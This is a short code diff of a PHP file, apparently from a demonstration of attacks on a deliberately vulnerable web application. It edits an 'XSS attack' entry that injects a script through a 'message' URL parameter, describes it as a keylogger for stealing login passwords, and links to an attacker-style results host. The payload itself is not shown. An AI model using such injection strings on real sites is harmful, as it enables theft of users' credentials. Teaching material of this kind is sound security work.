@@ -60,14 +60,11 @@ $attacks[3] = array(
 $attacks[4] = array(
     "name" => "XSS attack",
     "description" => "Steal your password on login site!",
-   "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
-   "attack" => "http://chichichacha.local/websecurity/vulnerable_web_application/index.php?message=<script>".$xss."</script>"
+    "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+    "attack" => "index.php?message=<script>".$xss."</script>"
 );
 
-
-
 echo "<script>".$xss."</script>";
-
 
 ?>
 
